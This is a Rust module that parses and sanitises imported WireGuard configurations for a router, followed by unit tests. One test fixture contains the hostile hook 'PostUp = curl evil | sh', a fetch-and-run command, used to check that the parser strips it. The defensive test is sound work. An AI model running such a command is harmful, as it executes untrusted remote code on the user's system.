use std::fs;
use std::net::{IpAddr, Ipv4Addr};
use std::path::Path;

use anyhow::{Context, Result, bail};

/// Keepalive keeps handshakes fresh on idle tunnels, which the health check relies on.
pub const DEFAULT_PERSISTENT_KEEPALIVE: u16 = 25;

/// Largest configuration accepted for import; real ones are well under 1 KiB.
pub const MAX_IMPORT_BYTES: usize = 16 * 1024;

/// `wg-quick` settings that `wg setconf` does not understand. The scripts are
/// never run, and `Table`/`FwMark` would fight the router's own routing.
const WG_QUICK_ONLY: [&str; 9] = [
    "DNS",
    "MTU",
    "Table",
    "SaveConfig",
    "PreUp",
    "PostUp",
    "PreDown",
    "PostDown",
    "FwMark",
];

#[derive(Eq, PartialEq)]
pub struct Config {
    pub addresses: Vec<(Ipv4Addr, u8)>,
    /// IPv4 resolvers from `DNS =`, reached through the tunnel.
    pub dns: Vec<Ipv4Addr>,
    pub set_conf: String,
    peers: Vec<Peer>,
}

/// `set_conf` holds the private key.
impl std::fmt::Debug for Config {
    fn fmt(&self, formatter: &mut std::fmt::Formatter<'_>) -> std::fmt::Result {
        formatter
            .debug_struct("Config")
            .field("addresses", &self.addresses)
            .field("dns", &self.dns)
            .field("set_conf", &crate::redact::secret(&self.set_conf))
            .field("peers", &self.peers)
            .finish()
    }
}

#[derive(Debug, Default, Eq, PartialEq)]
struct Peer {
    endpoint: bool,
    full_tunnel: bool,
}

impl Config {
    /// Checks a configuration uploaded by a user: exactly one peer, with an
    /// endpoint, carrying all IPv4 traffic (otherwise WireGuard silently drops
    /// what the router sends into the tunnel).
    pub fn check_importable(&self) -> Result<()> {
        let [peer] = self.peers.as_slice() else {
            bail!("the configuration must have exactly one [Peer]");
        };
        if !peer.endpoint {
            bail!("the [Peer] needs an Endpoint");
        }
        if !peer.full_tunnel {
            bail!("the [Peer] must route all IPv4 traffic (AllowedIPs = 0.0.0.0/0)");
        }
        Ok(())
    }
}

pub fn parse_file(path: impl AsRef<Path>) -> Result<Config> {
    let content = fs::read_to_string(path).context("read WireGuard config")?;
    parse(&content)
}

pub fn parse(content: &str) -> Result<Config> {
    let mut addresses = Vec::new();
    let mut dns = Vec::new();
    let mut peers: Vec<Peer> = Vec::new();
    let mut set_conf = String::new();
    let mut section = "";
    let mut peer_has_keepalive = false;
    for raw_line in content.lines() {
        let line = raw_line.trim();
        if line.is_empty() || line.starts_with('#') {
            continue;
        }
        if line.starts_with('[') && line.ends_with(']') {
            close_section(&mut set_conf, section, peer_has_keepalive);
            section = line;
            peer_has_keepalive = false;
            if section == "[Peer]" {
                peers.push(Peer::default());
            }
            set_conf.push_str(line);
            set_conf.push('\n');
            continue;
        }
        let Some((key, value)) = line.split_once('=') else {
            bail!("invalid WireGuard line in section {section}");
        };
        let key = key.trim();
        let value = value.trim();
        if section == "[Interface]" && key == "Address" {
            for raw_address in value.split(',') {
                let raw_address = raw_address.trim();
                let Some((address, prefix)) = raw_address.split_once('/') else {
                    bail!("invalid tunnel address {raw_address:?}");
                };
                let address: IpAddr = address
                    .parse()
                    .with_context(|| format!("invalid tunnel address {raw_address:?}"))?;
                let prefix: u8 = prefix
                    .parse()
                    .with_context(|| format!("invalid tunnel address {raw_address:?}"))?;
                // IPv6 is not forwarded by this router; ignore IPv6 tunnel addresses.
                let IpAddr::V4(address) = address else {
                    continue;
                };
                if prefix > 32 {
                    bail!("invalid IPv4 tunnel address {raw_address:?}");
                }
                addresses.push((address, prefix));
            }
            continue;
        }
        if section == "[Interface]" && key == "DNS" {
            // Also lists search domains and IPv6 resolvers; keep IPv4 addresses.
            dns.extend(
                value
                    .split(',')
                    .filter_map(|entry| entry.trim().parse::<Ipv4Addr>().ok()),
            );
            continue;
        }
        if WG_QUICK_ONLY.contains(&key) {
            continue;
        }
        if section == "[Peer]"
            && let Some(peer) = peers.last_mut()
        {
            match key {
                "Endpoint" => peer.endpoint = !value.is_empty(),
                "AllowedIPs" => {
                    peer.full_tunnel |= value
                        .split(',')
                        .any(|network| network.trim() == "0.0.0.0/0");
                }
                _ => {}
            }
        }
        if section == "[Peer]" && key == "PersistentKeepalive" {
            peer_has_keepalive = true;
        }
        set_conf.push_str(key);
        set_conf.push_str(" = ");
        set_conf.push_str(value);
        set_conf.push('\n');
    }
    close_section(&mut set_conf, section, peer_has_keepalive);
    if addresses.is_empty() || !set_conf.contains("PrivateKey =") || !set_conf.contains("[Peer]") {
        bail!("WireGuard config requires an IPv4 address, private key, and peer");
    }
    Ok(Config {
        addresses,
        dns,
        set_conf,
        peers,
    })
}

fn close_section(set_conf: &mut String, section: &str, has_keepalive: bool) {
    if section == "[Peer]" && !has_keepalive {
        set_conf.push_str(&format!(
            "PersistentKeepalive = {DEFAULT_PERSISTENT_KEEPALIVE}\n"
        ));
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn strips_quick_only_fields() {
        let config = parse(
            "[Interface]\nPrivateKey = secret\nAddress = 10.2.0.2/32\nDNS = 10.2.0.1\nTable = off\nMTU = 1420\nSaveConfig = false\n\n[Peer]\nPublicKey = public\nAllowedIPs = 0.0.0.0/0\nPersistentKeepalive = 15\n",
        )
        .unwrap();
        assert_eq!(config.addresses, vec![(Ipv4Addr::new(10, 2, 0, 2), 32)]);
        for field in ["Address", "DNS", "Table", "MTU", "SaveConfig"] {
            assert!(!config.set_conf.contains(field));
        }
        assert!(config.set_conf.contains("PersistentKeepalive = 15\n"));
        assert_eq!(config.set_conf.matches("PersistentKeepalive").count(), 1);
    }

    #[test]
    fn ignores_ipv6_tunnel_addresses() {
        let config = parse(
            "[Interface]\nPrivateKey = secret\nAddress = 10.2.0.2/32, 2a07:b944::2:2/128\n[Peer]\nPublicKey = public\nAllowedIPs = 0.0.0.0/0, ::/0\n",
        )
        .unwrap();
        assert_eq!(config.addresses, vec![(Ipv4Addr::new(10, 2, 0, 2), 32)]);
    }

    #[test]
    fn requires_an_ipv4_tunnel_address() {
        assert!(
            parse("[Interface]\nPrivateKey = secret\nAddress = 2a07:b944::2:2/128\n[Peer]\nPublicKey = public\n")
                .is_err()
        );
    }

    #[test]
    fn adds_keepalive_when_missing() {
        let config = parse(
            "[Interface]\nPrivateKey = secret\nAddress = 10.2.0.2/32\n[Peer]\nPublicKey = public\nAllowedIPs = 0.0.0.0/0\n",
        )
        .unwrap();
        assert!(config.set_conf.ends_with("PersistentKeepalive = 25\n"));
    }

    #[test]
    fn reads_ipv4_resolvers_and_drops_wg_quick_settings() {
        let config = parse(
            "[Interface]\nPrivateKey = secret\nAddress = 10.64.1.2/32,fc00::2/128\nDNS = 10.64.0.1, fc00::1, home.lan\nPostUp = curl evil | sh\nFwMark = 0x100\nTable = 1234\n[Peer]\nPublicKey = public\nAllowedIPs = 0.0.0.0/0,::/0\nEndpoint = 185.65.134.1:51820\n",
        )
        .unwrap();
        assert_eq!(config.dns, vec![Ipv4Addr::new(10, 64, 0, 1)]);
        for field in ["PostUp", "curl", "FwMark", "Table", "DNS"] {
            assert!(!config.set_conf.contains(field), "{field}");
        }
        config.check_importable().unwrap();
    }

    #[test]
    fn imports_need_one_full_tunnel_peer_with_an_endpoint() {
        let check = |text: &str| parse(text).unwrap().check_importable();
        let interface = "[Interface]\nPrivateKey = secret\nAddress = 10.0.0.2/32\n";
        assert!(
            check(&format!(
                "{interface}[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0\n"
            ))
            .unwrap_err()
            .to_string()
            .contains("Endpoint")
        );
        assert!(check(&format!("{interface}[Peer]\nPublicKey = p\nAllowedIPs = 10.0.0.0/8\nEndpoint = 1.2.3.4:51820\n")).unwrap_err().to_string().contains("0.0.0.0/0"));
        assert!(check(&format!("{interface}[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/0\nEndpoint = 1.2.3.4:51820\n[Peer]\nPublicKey = q\nAllowedIPs = 10.9.0.0/16\nEndpoint = 5.6.7.8:51820\n")).unwrap_err().to_string().contains("exactly one"));
        check(&format!("{interface}[Peer]\nPublicKey = p\nAllowedIPs = 0.0.0.0/1, 128.0.0.0/1, 0.0.0.0/0\nEndpoint = vpn.example.com:51820\n")).unwrap();
    }

    #[test]
    fn invalid_line_error_does_not_echo_content() {
        let error = parse("[Interface]\nnot-a-key-value-private-material\n").unwrap_err();
        assert!(!error.to_string().contains("private-material"));
    }
}
